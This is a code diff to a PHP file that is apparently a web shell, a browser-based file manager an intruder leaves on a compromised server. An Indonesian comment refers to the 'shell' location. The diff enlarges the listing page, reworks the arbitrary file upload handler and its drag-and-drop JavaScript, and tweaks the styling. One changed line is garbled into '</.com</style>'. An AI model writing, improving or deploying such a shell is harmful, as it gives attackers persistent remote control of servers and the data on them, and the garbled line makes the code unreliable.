@@ -5,7 +5,7 @@ ini_set('display_errors', 0);
 error_reporting(E_ALL);
 
 $session_timeout = 1800;
-$pageSize        = 100;
+$pageSize        = 200;
 
 /* ============================================================= */
 /*  URL FIX: BASED ON public_html, BUKAN LOKASI SHELL          */
@@ -155,8 +155,11 @@ if(isset($_POST['action'])){
             if(!empty($_FILES['upload_files']['name'][0])){
                 foreach($_FILES['upload_files']['name'] as $i=>$n){
                     $tmp=$_FILES['upload_files']['tmp_name'][$i];
-                    if($tmp){
-                        @move_uploaded_file($tmp, ts($basePath).$n);
+                    if($tmp && !empty($n)){
+                        $target = ts($basePath) . $n;
+                        if(@move_uploaded_file($tmp, $target)){
+                            // Sukses
+                        }
                     }
                 }
             }
@@ -273,7 +276,6 @@ foreach ($filtered as $f) {
     }
 }
 
-// Sort masing-masing
 function cmpName($a, $b) { return strcasecmp($a, $b); }
 function cmpSize($a, $b) {
     global $basePath;
@@ -303,7 +305,6 @@ if ($sort === 'size') {
     usort($files, 'cmpName');
 }
 
-// Gabungkan: folder dulu, baru file
 $sortedFiles = array_merge($dirs, $files);
 
 $totalItems = count($sortedFiles);
@@ -382,7 +383,7 @@ table td:nth-child(1), table th:nth-child(1) {width:5%;text-align:center;}
 .download {color:#8ff;}
 .edit {color:#afc;}
 .del {color:#f66;}
-.openlink {background:#ff0000 !important;color:#000 !important;border-color:#fff !important;}
+.openlink {background:#0a3 !important;color:#000 !important;border-color:#0f6 !important;}
 .openlink:hover {background:#0c6 !important;box-shadow:0 0 10px rgba(0,255,0,0.6)!important;}
 .paging {text-align:center;margin:10px 0;}
 .paging a {display:inline-block;padding:6px 10px;margin:2px;background:#060a32;color:#0ff;border:1px solid #0ff;border-radius:4px;text-decoration:none;transition:background .3s,box-shadow .3s,color .3s;}
@@ -395,7 +396,7 @@ table td:nth-child(1), table th:nth-child(1) {width:5%;text-align:center;}
 .form-group input[type=text]:focus, .form-group textarea:focus {border-color:#0ff;box-shadow:0 0 8px #0ff;}
 .form-group input[type=submit] {background:#0ff;color:#000;border:none;padding:8px 16px;border-radius:4px;font-weight:bold;cursor:pointer;transition:background .3s,box-shadow .3s;}
 .form-group input[type=submit]:hover {background:#0cc;box-shadow:0 0 10px rgba(0,255,255,0.6);}
-.drag-area {border:2px dashed #0ff;padding:20px;text-align:center;border-radius:6px;margin-bottom:10px;color:#aaa;transition:background .3s ease,color .3s ease,box-shadow .3s;}
+.drag-area {border:2px dashed #0ff;padding:40px;text-align:center;border-radius:6px;margin-bottom:10px;color:#aaa;transition:background .3s ease,color .3s ease,box-shadow .3s;}
 .drag-area.hover {background:#060a32;color:#0ff;box-shadow:0 0 10px rgba(0,255,255,0.5);}
 #overlay {display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9998;}
 #renameBox, #chmodBox {display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:9999;background:rgba(10,10,40,0.9);border:2px solid #0ff;border-radius:6px;width:320px;max-width:90%;padding:20px;box-shadow:0 0 15px rgba(0,255,255,0.8);}
@@ -408,7 +409,7 @@ table td:nth-child(1), table th:nth-child(1) {width:5%;text-align:center;}
 #renameBox button:hover, #chmodBox button:hover {background:#666;color:#fff;}
 .footer {text-align:center;margin:30px 0 15px 0;color:#aaa;font-size:0.85em;}
 .footer span {color:#0ff;}
-</style>
+</.com</style>
 <script src="https://cdn.jsdelivr.net/npm/ace-builds@1.23.1/src-min-noconflict/ace.js"></script>
 </head>
 <body>
@@ -598,7 +599,6 @@ table td:nth-child(1), table th:nth-child(1) {width:5%;text-align:center;}
         echo '<tr>';
         echo '<td style="text-align:center;">'.$icon.'</td>';
 
-        // FOLDER BISA DIKLIK
         if($isDir){
             echo '<td><a href="?path='.urlencode($full).'"><strong>'.htmlspecialchars($f).'</strong></a></td>';
         } else {
@@ -665,24 +665,48 @@ function showTab(tab){
   if(el) el.style.display="block";
 }
 
-var dragArea=document.getElementById('dragArea');
-if(dragArea){
-  var uploadForm=document.getElementById('uploadForm');
-  dragArea.addEventListener('dragover',function(e){ e.preventDefault(); dragArea.classList.add('hover'); });
-  dragArea.addEventListener('dragleave',function(e){ dragArea.classList.remove('hover'); });
-  dragArea.addEventListener('drop',function(e){
-    e.preventDefault(); dragArea.classList.remove('hover');
-    var files=e.dataTransfer.files;
-    var formData=new FormData(uploadForm);
-    for(var i=0;i<files.length;i++){
-      formData.append('upload_files[]',files[i]);
-    }
-    formData.set('action','upload');
-    fetch('',{method:'POST',body:formData})
-    .then(r=>r.text())
-    .then(()=>{ alert('Upload selesai!'); location.reload(); })
-    .catch(()=>{ alert('Gagal upload!'); });
-  });
+var dragArea = document.getElementById('dragArea');
+if (dragArea) {
+    var uploadForm = document.getElementById('uploadForm');
+    var pathInput = uploadForm.querySelector('input[name="path"]');
+    var actionInput = uploadForm.querySelector('input[name="action"]');
+
+    dragArea.addEventListener('dragover', function(e) {
+        e.preventDefault();
+        dragArea.classList.add('hover');
+    });
+    dragArea.addEventListener('dragleave', function(e) {
+        dragArea.classList.remove('hover');
+    });
+    dragArea.addEventListener('drop', function(e) {
+        e.preventDefault();
+        dragArea.classList.remove('hover');
+
+        var files = e.dataTransfer.files;
+        if (files.length === 0) return;
+
+        var formData = new FormData();
+        for (var i = 0; i < files.length; i++) {
+            formData.append('upload_files[]', files[i]);
+        }
+
+        // TAMBAHKAN PATH & ACTION
+        formData.append('path', pathInput.value);
+        formData.append('action', 'upload');
+
+        fetch('', {
+            method: 'POST',
+            body: formData
+        })
+        .then(r => r.text())
+        .then(() => {
+            alert('Upload selesai!');
+            location.reload();
+        })
+        .catch(() => {
+            alert('Gagal upload!');
+        });
+    });
 }
 
 function openRenameBox(oldName){
